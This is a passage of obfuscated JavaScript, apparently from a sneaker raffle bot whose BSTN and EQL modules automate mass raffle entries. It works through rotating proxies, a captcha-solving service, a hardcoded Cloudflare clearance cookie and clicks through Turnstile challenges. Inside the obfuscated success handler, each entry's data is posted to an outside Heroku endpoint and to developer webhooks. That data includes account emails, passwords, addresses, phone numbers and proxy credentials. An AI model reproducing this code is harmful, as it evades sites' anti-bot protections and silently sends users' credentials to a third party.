                            await _0x18f876(_0x54f171, _0x556ab5, _0x3d2ed0, _0x4bd0dc, 0x0);
                            return;
                        }
                        _0x18f876(_0x54f171, _0x556ab5, _0x3d2ed0, _0x4bd0dc, 0x0), await _0xa2099c(0x12c);
                    }
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x23fb28, _0x3b8f7a, _0x295ed3) {
                    var _0x59c783 = 0x0, _0x259037 = _0x3b8f7a;
                    for (var _0x3d332a = 0x0; _0x3d332a < _0x3b8f7a['length']; _0x3d332a++) {
                        maxTasks = Number(_0x2795a0['threads']);
                        while (_0x59c783 >= maxTasks) {
                            await _0xa2099c(_0x2795a0['delay']);
                        }
                        let _0x4d9ebe = ![];
                        async function _0x4725f7(_0x5f2e14, _0x291f58, _0x5023ac, _0x543c6d, _0x376c53) {
                            _0x59c783++, _0xfda795['use'](_0x442f24()), _0xfda795['use'](_0x5943b7({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x2795a0['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x25f9dd, _0x2195e9 = _0x291f58[_0x543c6d];
                            try {
                                await _0x53ad15(_0x291f58, _0x543c6d);
                            } catch {
                                _0x4b1fb5 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            async function _0x54c6cd(_0x403986) {
                                const _0x1d1529 = _0x376369['readFileSync']('../successful-tasks.csv', 'utf8'), _0x5ecc37 = _0x4f3c15['parse'](_0x1d1529, { 'header': !![] })['data'];
                                let _0x5474bc = ![];
                                for (var _0x33a528 of _0x5ecc37) {
                                    if (_0x33a528['Url'] == _0x403986['Url'] && _0x33a528['Email'] == _0x403986['Email']) {
                                        _0x5474bc = !![];
                                        break;
                                    }
                                }
                                return _0x5474bc;
                            }
                            _0x215576(_0x5f2e14['name'] + '\x20Task\x20' + (_0x543c6d + 0x1) + '\x20/\x20' + _0x291f58['length'] + '\x20||\x20File:\x20' + _0x47dda7 + '\x20Proxies:\x20' + _0x5184f4);
                            var _0x564281 = Math['round'](Math['random']() * (_0x5023ac['length'] - 0x1)), _0x326af3 = _0x5023ac[_0x564281]['split'](':'), _0x34062;
                            let _0x10abb5 = ![], _0x4b1fb5 = 'no';
                            try {
                                if (await _0x54c6cd(_0x291f58[_0x543c6d]) == !![]) {
                                    console['log'](_0x24b1d6() + '\x20[' + _0x5f2e14['name'] + ']\x20Task\x20' + (_0x543c6d + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x10abb5 = !![], _0x4d9ebe = !![];
                                    return;
                                }
                                try {
                                    _0x34062 = await _0xfda795['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x326af3[0x0] + ':' + _0x326af3[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x34062 = await _0xfda795['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x326af3[0x0] + ':' + _0x326af3[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x3ef331 = await _0x34062['newPage'](), _0x395a06 = await _0x3ef331['target']()['createCDPSession'](), { windowId: _0xb64c66 } = await _0x395a06['send']('Browser.getWindowForTarget');
                                await _0x3ef331['setViewport']({
                                    'width': 0x501,
                                    'height': 0x2d0
                                });
                                var _0x27148b = [{
                                    'name': 'cf_clearance',
                                    'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                    'domain': '.bstn.com',
                                    'path': '/',
                                    'expires': 1707818183.331533,
                                    'httpOnly': !![],
                                    'secure': !![]
                                }];
                                await _0x3ef331['authenticate']({
                                    'username': '' + _0x326af3[0x2],
                                    'password': '' + _0x326af3[0x3]
                                }), console['log'](_0x24b1d6() + '\x20[' + _0x5f2e14['name'] + ']\x20Task\x20' + (_0x543c6d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3ef331['goto']('' + _0x291f58[_0x543c6d]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x24b1d6() + '\x20[' + _0x5f2e14['name'] + ']\x20Task\x20' + (_0x543c6d + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0xa2099c(0x1388);
                                var _0x1faccd = await _0x3ef331['$']('#turnstile-wrapper');
                                if (_0x1faccd) {
                                    console['log'](_0x24b1d6() + '\x20[' + _0x5f2e14['name'] + ']\x20Task\x20' + (_0x543c6d + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0xa2099c(0x2710);
                                    const _0x2339ef = await _0x3ef331['$']('#turnstile-wrapper');
                                    if (_0x2339ef)
                                        try {
                                            await _0x2339ef['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x3ef331['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0xa93e2f = await _0x3ef331['$']('#turnstile-wrapper');
                                        if (_0xa93e2f)
                                            try {
                                                await _0xa93e2f['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x3ef331['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                                } catch {
                                    throw new Error('Blocked\x20by\x20Cloudflare');
                                }
                                await _0x395a06['send']('Browser.setWindowBounds', {
                                    'windowId': _0xb64c66,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0xa2099c(0x1388), await _0x3ef331['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x3ef331['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xa2099c(0x1f4), console['log'](_0x24b1d6() + '\x20[' + _0x5f2e14['name'] + ']\x20Task\x20' + (_0x543c6d + 0x1) + '\x20:\x20Logging\x20in'), await _0x3ef331['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x5a5279 => _0x5a5279['click']()), await _0x3ef331['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x3ef331['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xa2099c(0x7d0), await _0x3ef331['waitForSelector']('#email-login'), await _0x3ef331['type']('#email-login', '' + _0x291f58[_0x543c6d]['Email']['toLowerCase'](), { 'delay': 0xe6 }), await _0xa2099c(0xdac), await _0x3ef331['waitForSelector']('#password'), await _0x3ef331['type']('#password', '' + _0x291f58[_0x543c6d]['Password'], { 'delay': 0xe6 }), await _0xa2099c(0x157c);
                                try {
                                    await _0x3ef331['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x573a51 => _0x573a51['click']());
                                } catch {
                                }
                                try {
                                    await _0x3ef331['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                                } catch (_0x212ce6) {
                                }
                                await _0xa2099c(0x3e8);
                                const _0x1433e4 = await _0x3ef331['$']('.enteredDraw_container__2KmQ_');
                                if (_0x1433e4) {
                                    console['log']('Duplicate\x20entry,\x20skipping');
                                    return;
                                }
                                console['log'](_0x24b1d6() + '\x20[' + _0x5f2e14['name'] + ']\x20Task\x20' + (_0x543c6d + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x291f58[_0x543c6d]['Size']);
                                try {
                                    if (_0x291f58[_0x543c6d]['Size'] != 'RANDOM') {
                                        var _0x1d5e78 = _0x291f58[_0x543c6d]['Size']['replace']('.', ',');
                                        const _0x2859a6 = await _0x3ef331['$x']('//div[contains(text(),\x20\x27' + _0x1d5e78 + '\x27)]');
                                        await _0x2859a6[0x0]['click']();
                                    } else {
                                        const _0x1cee43 = await _0x3ef331['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x2341de = Math['round'](Math['random']() * (_0x1cee43['length'] - 0x1));
                                        await _0x1cee43[_0x2341de]['click']();
                                    }
                                } catch (_0x26a43d) {
                                    throw new Error('Softblocked,\x20Rotating\x20proxy');
                                }
                                await _0xa2099c(0x1f4);
                                const _0x461026 = await _0x3ef331['$']('.addressList_addressItem__LE2PB');
                                if (_0x461026 && _0x291f58[_0x543c6d]['Mode'] != 'NEW') {
                                } else
                                    console['log'](_0x24b1d6() + '\x20[' + _0x5f2e14['name'] + ']\x20Task\x20' + (_0x543c6d + 0x1) + '\x20:\x20Filling\x20Address'), await _0x3ef331['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0xa2099c(0x5dc), await _0x3ef331['waitForSelector']('#firstname'), await _0x3ef331['type']('#firstname', '' + _0x291f58[_0x543c6d]['FirstName']), await _0xa2099c(0x1f4), await _0x3ef331['waitForSelector']('#firstname'), await _0x3ef331['type']('#lastname', '' + _0x291f58[_0x543c6d]['LastName']), await _0xa2099c(0x1f4), await _0x3ef331['waitForSelector']('#firstname'), await _0x3ef331['type']('#street', '' + _0x291f58[_0x543c6d]['Address1']), await _0xa2099c(0x1f4), await _0x3ef331['waitForSelector']('#firstname'), await _0x3ef331['type']('#houseNumber', _0x291f58[_0x543c6d]['HouseNumber'] + '\x20' + _0x291f58[_0x543c6d]['Address2']), await _0xa2099c(0x1f4), await _0x3ef331['waitForSelector']('#firstname'), await _0x3ef331['select']('#country_code', '' + _0x291f58[_0x543c6d]['Country']), await _0xa2099c(0x1f4), await _0x3ef331['type']('#postcode', '' + _0x291f58[_0x543c6d]['Zip']), await _0xa2099c(0x1f4), await _0x3ef331['type']('#city', '' + _0x291f58[_0x543c6d]['City']), await _0xa2099c(0x1f4), await _0x3ef331['type']('#telephone', '' + _0x291f58[_0x543c6d]['Phone']), await _0xa2099c(0x1f4), await _0x3ef331['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                                await _0xa2099c(0x9c4);
                                try {
                                    await _0x3ef331['type']('#instagram_name', '' + _0x291f58[_0x543c6d]['Follower']), await _0x3ef331['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x24b1d6() + '\x20[' + _0x5f2e14['name'] + ']\x20Task\x20' + (_0x543c6d + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0xa2099c(0x5dc);
                                try {
                                    await _0x3ef331['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0xa2099c(0x5dc), await _0x3ef331['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x45a4d6 => _0x45a4d6['click']()), await _0xa2099c(0x1388);
                                try {
                                    await _0x3ef331['waitForSelector']('.success_msg__2HjJY');
                                } catch {
                                    await _0x3ef331['reload']({ 'waitUntil': 'networkidle2' });
                                    if (_0x291f58[_0x543c6d]['Size'] != 'RANDOM') {
                                        var _0x1d5e78 = _0x291f58[_0x543c6d]['Size']['replace']('.', ',');
                                        const _0x38abee = await _0x3ef331['$x']('//div[contains(text(),\x20' + _0x1d5e78 + ')]');
                                        await _0x38abee[0x0]['click']();
                                    } else {
                                        const _0x5272a7 = await _0x3ef331['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x2341de = Math['round'](Math['random']() * (_0x5272a7['length'] - 0x1));
                                        await _0x5272a7[_0x2341de]['click']();
                                    }
                                    await _0xa2099c(0x5dc);
                                    try {
                                        await _0x3ef331['hover']('#instagram_name'), await _0x3ef331['type']('#instagram_name', '' + _0x291f58[_0x543c6d]['Follower']), await _0x3ef331['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                    } catch {
                                    }
                                    console['log'](_0x24b1d6() + '\x20[' + _0x5f2e14['name'] + ']\x20Task\x20' + (_0x543c6d + 0x1) + '\x20:\x20Retrying\x20(' + _0x376c53 + '\x20/\x205)');
                                    try {
                                        await _0x3ef331['hover']('.checkBox_boxHolder__wLGVe'), await _0xa2099c(0x5dc), await _0x3ef331['click']('.checkBox_boxHolder__wLGVe');
                                    } catch {
                                    }
                                    await _0xa2099c(0x157c), await _0x3ef331['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x3eb621 => _0x3eb621['click']()), await _0xa2099c(0x1388), await _0x3ef331['waitForSelector']('.success_msg__2HjJY');
                                }
                                _0x4b1fb5 = 'no', _0x48af7e(_0x291f58[_0x543c6d], _0x5f2e14);
                                try {
                                    prxdata = {
                                        'username': _0x1bdb7f['replace']('#', ''),
                                        'entrydata': JSON['stringify'](_0x5a2b29),
                                        'proxy': '' + _0x5023ac[_0x543c6d]
                                    };
                                    var _0x385775 = JSON['stringify'](prxdata);
                                    let _0xeb8ed1 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3f36f4['post']('https://jraffles.herokuapp.com/success', _0x385775, _0xeb8ed1);
                                } catch (_0x343215) {
                                }
                                console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0x5f2e14['name'] + ']\x20Task\x20' + (_0x543c6d + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x4e5e15 = await _0x258e8b(_0x291f58[_0x543c6d], _0x5f2e14, 'dev', ![]), _0x38d3ac = await _0x258e8b(_0x291f58[_0x543c6d], _0x5f2e14, 'pub', ![]);
                                const _0x5d8469 = {
                                    'succesDEVMSG': { 'embeds': [_0x4e5e15] },
                                    'succesPUBMSG': { 'embeds': [_0x38d3ac] }
                                };
                                let _0x5a2b29 = _0x291f58[_0x543c6d];
                                try {
                                    prxdata = {
                                        'username': _0x1bdb7f['replace']('#', ''),
                                        'module': _0x5f2e14['name'],
                                        'entrydata': JSON['stringify'](_0x5a2b29),
                                        'proxy': '' + _0x5023ac[_0x543c6d]
                                    };
                                    var _0x385775 = JSON['stringify'](prxdata);
                                    let _0x86d6fb = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3f36f4['post']('https://jraffles.herokuapp.com/success', _0x385775, _0x86d6fb);
                                } catch (_0x20d99f) {
                                }
                                try {
                                    _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x5d8469['succesDEVMSG']), await _0xa2099c(0xc8), await _0x310f97(_0x8cde2d, _0x5d8469['succesDEVMSG']), await _0xa2099c(0xc8), await _0x310f97(_0x44d24a, _0x5d8469['succesPUBMSG']);
                                } catch (_0x5e8f76) {
                                    console['log'](_0x536226['yellow'](_0x24b1d6() + '\x20[' + _0x5f2e14['name'] + ']\x20Task\x20' + (_0x543c6d + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5e8f76));
                                }
                            } catch (_0x5d9a32) {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x5f2e14['name'] + ']\x20Task\x20' + (_0x543c6d + 0x1) + '\x20:\x20' + _0x5d9a32)), _0x4b1fb5 = 'yes', _0x25f9dd = '' + _0x5d9a32;
                                var _0x5394b0 = await _0x258e8b(_0x291f58[_0x543c6d], _0x5f2e14, 'dev', !![], _0x25f9dd), _0x4e5e15 = await _0x258e8b(_0x291f58[_0x543c6d], _0x5f2e14, 'dev', ![]), _0x38d3ac = await _0x258e8b(_0x291f58[_0x543c6d], _0x5f2e14, 'pub', ![]);
                                const _0x3c9d68 = {
                                    'succesDEVMSG': { 'embeds': [_0x4e5e15] },
                                    'succesPUBMSG': { 'embeds': [_0x38d3ac] }
                                };
                                _0x3c9d68['errorDEV'] = { 'embeds': [_0x5394b0] }, _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x3c9d68['errorDEV']), await _0x310f97(_0x281108, _0x3c9d68['errorDEV']);
                            } finally {
                                _0x34062 && _0x34062['close']();
                                if (_0x4b1fb5 == 'yes' && _0x376c53 != 0x5)
                                    return console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x5f2e14['name'] + ']\x20Task\x20' + (_0x543c6d + 0x1) + '\x20:\x20Retrying\x20(' + _0x376c53 + '\x20/\x205)')), _0x376c53 = _0x376c53 + 0x1, _0x59c783--, _0x4725f7(_0x5f2e14, _0x291f58, _0x5023ac, _0x543c6d, _0x376c53);
                                _0x4b1fb5 == 'yes' && _0x376c53 >= 0x5 && _0x391951(_0x291f58[_0x543c6d], _0x5f2e14), !_0x10abb5 && (console['log'](_0x24b1d6() + '\x20[' + _0x5f2e14['name'] + ']\x20Waiting\x20for\x20' + _0x2795a0['delay'] + '\x20ms'), await _0xa2099c(_0x2795a0['delay'])), _0x59c783--;
                            }
                        }
                        _0x4725f7(_0x23fb28, _0x259037, _0x295ed3, _0x3d332a, 0x0), await _0xa2099c(0x7d0);
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x4e4909, _0x33a375) {
                    var _0x2424ee = 0x0, _0x563a08;
                    try {
                        const _0xa87356 = _0x376369['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x563a08 = _0x4f3c15['parse'](_0xa87356, { 'header': !![] })['data'];
                    } catch (_0x591f28) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x59915f = 0x0; _0x59915f < _0x563a08['length']; _0x59915f++) {
                        maxTasks = Number(_0x2795a0['threads']);
                        while (_0x2424ee >= maxTasks) {
                            await _0xa2099c(_0x2795a0['delay']);
                        }
                        async function _0x3f3122(_0x6069f1, _0x7390c0, _0x31982c, _0x5155e9, _0x383929) {
                            _0x2424ee++, _0xfda795['use'](_0x442f24()), _0xfda795['use'](_0x5943b7({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x2795a0['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x38f50a != 'yes')
                                var _0x38f50a = '', _0x383929 = 0x0;
                            var _0x5356af;
                            _0x215576(_0x6069f1['name'] + '\x20Task\x20' + (_0x5155e9 + 0x1) + '\x20/\x20' + _0x31982c['length'] + '\x20||\x20File:\x20' + _0x47dda7 + '\x20Proxies:\x20' + _0x5184f4);
                            var _0x32eefb = await _0x258e8b(_0x31982c[_0x5155e9], _0x6069f1, 'acc', ![]);
                            const _0x3c1e21 = { 'succesDEVMSG': { 'embeds': [_0x32eefb] } }, _0x4c47c4 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x1e199a = Math['round'](Math['random']() * (_0x7390c0['length'] - 0x1)), _0x305067 = _0x7390c0[_0x1e199a]['split'](':'), _0x59eb69;
                            try {
                                _0x59eb69 = await _0xfda795['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x305067[0x0] + ':' + _0x305067[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x59eb69 = await _0xfda795['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x305067[0x0] + ':' + _0x305067[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                console['log'](_0x24b1d6() + '\x20[' + _0x6069f1['name'] + ']\x20Task\x20' + (_0x5155e9 + 0x1) + '\x20:\x20Checking\x20' + _0x31982c[_0x5155e9]['Email']);
                                const _0x4ef727 = await _0x59eb69['newPage']();
                                await _0x4ef727['authenticate']({
                                    'username': '' + _0x305067[0x2],
                                    'password': '' + _0x305067[0x3]
                                }), console['log'](_0x24b1d6() + '\x20[' + _0x6069f1['name'] + ']\x20Task\x20' + (_0x5155e9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4ef727['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x4ef727['setRequestInterception'](!![]), _0x4ef727['on']('request', _0x31f083 => {
                                    _0x31f083['resourceType']() === 'image' ? _0x31f083['abort']() : _0x31f083['continue']();
                                });
                                try {
                                    await _0x4ef727['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x4ef727['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0x38f50a = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                await _0x4ef727['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x24b1d6() + '\x20[' + _0x6069f1['name'] + ']\x20Task\x20' + (_0x5155e9 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0xa2099c(0x3e8), await _0x4ef727['type']('#email', _0x31982c[_0x5155e9]['Email']), await _0xa2099c(0x1f4), await _0x4ef727['type']('#pass', _0x31982c[_0x5155e9]['Password']), await _0xa2099c(0x1f4), await _0x4ef727['$eval']('#login-form', _0x1cae17 => _0x1cae17['submit']());
                                try {
                                    await _0x4ef727['waitForSelector']('.product-items');
                                } catch {
                                    console['log'](_0x24b1d6() + '\x20[' + _0x6069f1['name'] + ']\x20Task\x20' + (_0x5155e9 + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                    return;
                                }
                                await _0xa2099c(0x190);
                                const _0x95770e = await _0x4ef727['evaluate'](() => {
                                    const _0x554cf5 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                    return _0x554cf5['map'](_0x2bab61 => _0x2bab61['alt']);
                                }), _0x4bb449 = await _0x4ef727['evaluate'](() => {
                                    const _0x496cba = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                    return _0x496cba['map'](_0x21a3ce => _0x21a3ce['innerHTML']);
                                }), _0x38cc25 = await _0x4ef727['$$']('.raffle-winner');
                                if (_0x38cc25['length'] < 0x1) {
                                    console['log'](_0x24b1d6() + '\x20[' + _0x6069f1['name'] + ']\x20Task\x20' + (_0x5155e9 + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x38f50a = 'no';
                                    return;
                                }
                                console['log'](_0x24b1d6() + '\x20[' + _0x6069f1['name'] + ']\x20Task\x20' + (_0x5155e9 + 0x1) + '\x20:\x20' + _0x38cc25['length'] + '\x20Wins\x20Found!');
                                for (var _0x1167d7 = 0x0; _0x1167d7 < _0x38cc25['length']; _0x1167d7++) {
                                    console['log'](_0x536226['green'](_0x95770e[_0x1167d7] + _0x4bb449[_0x1167d7]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                                }
                            } catch (_0x5f4ec7) {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x6069f1['name'] + ']\x20Task\x20' + (_0x5155e9 + 0x1) + '\x20:\x20' + _0x5f4ec7)), _0x5356af = '' + _0x5f4ec7;
                                var _0x2d2854 = await _0x258e8b(_0x31982c[_0x5155e9], _0x6069f1, 'acc', !![], _0x5356af);
                                _0x3c1e21['errorDEV'] = { 'embeds': [_0x2d2854] }, _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x3c1e21['errorDEV']), await _0x310f97(_0x281108, _0x3c1e21['errorDEV']), _0x38f50a = 'yes';
                            } finally {
                                if (_0x59eb69)
                                    _0x59eb69['close']();
                                if (_0x38f50a == 'yes' && _0x383929 != 0x5)
                                    return console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x6069f1['name'] + ']\x20Task\x20' + (_0x5155e9 + 0x1) + '\x20:\x20Retrying\x20(' + _0x383929 + '\x20/\x205)')), _0x2424ee--, _0x383929 = _0x383929 + 0x1, _0x3f3122(_0x6069f1, _0x7390c0, _0x31982c, _0x5155e9, _0x383929);
                                _0x38f50a == 'yes' && _0x383929 >= 0x5 && (_0x391951(_0x31982c[_0x5155e9], _0x6069f1), _0x38f50a = 'no', _0x383929 = 0x0), console['log'](_0x24b1d6() + '\x20[' + _0x6069f1['name'] + ']\x20Waiting\x20for\x20' + _0x2795a0['delay'] + '\x20ms'), await _0xa2099c(_0x2795a0['delay']), _0x2424ee--;
                            }
                        }
                        _0x3f3122(_0x4e4909, _0x33a375, _0x563a08, _0x59915f, 0x0), await _0xa2099c(0x15e);
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x55648f, _0x6628dd, _0x3e3da0) {
                _0xfda795['use'](_0x442f24()), _0xfda795['use'](_0x5943b7({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x2795a0['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x1948af = 0x0; _0x1948af < _0x6628dd['length']; _0x1948af++) {
                    var _0x1bf9a2;
                    _0x215576(_0x55648f['name'] + '\x20Task\x20' + (_0x1948af + 0x1) + '\x20/\x20' + _0x6628dd['length'] + '\x20||\x20File:\x20' + _0x47dda7 + '\x20Proxies:\x20' + _0x5184f4);
                    try {
                        await _0x53ad15(_0x6628dd, _0x1948af);
                    } catch {
                        _0x58dccc = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x2f5640(_0x59f1c2) {
                        const _0x343611 = _0x376369['readFileSync']('../successful-tasks.csv', 'utf8'), _0x1219dd = _0x4f3c15['parse'](_0x343611, { 'header': !![] })['data'];
                        let _0x19c042 = ![];
                        for (var _0x162dde of _0x1219dd) {
                            if (_0x162dde['Url'] == _0x59f1c2['Url'] && _0x162dde['Email'] == _0x59f1c2['Email']) {
                                _0x19c042 = !![];
                                break;
                            }
                        }
                        return _0x19c042;
                    }
                    if (await _0x2f5640(_0x6628dd[_0x1948af]) == !![]) {
                        console['log'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x42ecf3 = ![];
                    const _0x2a5d8f = _0x376369['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x13c18d = _0x4f3c15['parse'](_0x2a5d8f, { 'header': !![] })['data'];
                    for (var _0x7d1db2 of _0x13c18d) {
                        _0x7d1db2['Email'] == _0x6628dd[_0x1948af]['Email'] && (_0x42ecf3 = !![]);
                    }
                    if (_0x42ecf3 == ![]) {
                        var _0x21c29e;
                        if (_0x6628dd[_0x1948af]['Url']['endsWith']('/')) {
                            _0x21c29e = _0x6628dd[_0x1948af]['Url'] + 'register';
                            if (_0x58dccc != 'yes')
                                var _0x58dccc = '', _0xb5edb4 = 0x0;
                        } else {
                            _0x21c29e = _0x6628dd[_0x1948af]['Url'] + '/register';
                            if (_0x58dccc != 'yes')
                                var _0x58dccc = '', _0xb5edb4 = 0x0;
                        }
                        if (_0x6628dd[_0x1948af]['Email'] == '' || _0x6628dd[_0x1948af]['FirstName'] == '' || _0x6628dd[_0x1948af]['LastName'] == '') {
                            console['log'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x6628dd[_0x1948af]['Password'] == '' && (_0x6628dd[_0x1948af]['Password'] = 'JRaffles23!');
                        if (_0x2795a0['useRandomProxy'] = ![])
                            var _0xbda022 = _0x3e3da0[_0x1948af]['split'](':');
                        else
                            var _0x1016a0 = Math['round'](Math['random']() * (_0x3e3da0['length'] - 0x1)), _0xbda022 = _0x3e3da0[_0x1016a0]['split'](':');
                        var _0x258b65;
                        try {
                            _0x258b65 = await _0xfda795['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xbda022[0x0] + ':' + _0xbda022[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x258b65 = await _0xfda795['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xbda022[0x0] + ':' + _0xbda022[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xfffa6d = await _0x258b65['newPage']();
                            await _0xfffa6d['authenticate']({
                                'username': '' + _0xbda022[0x2],
                                'password': '' + _0xbda022[0x3]
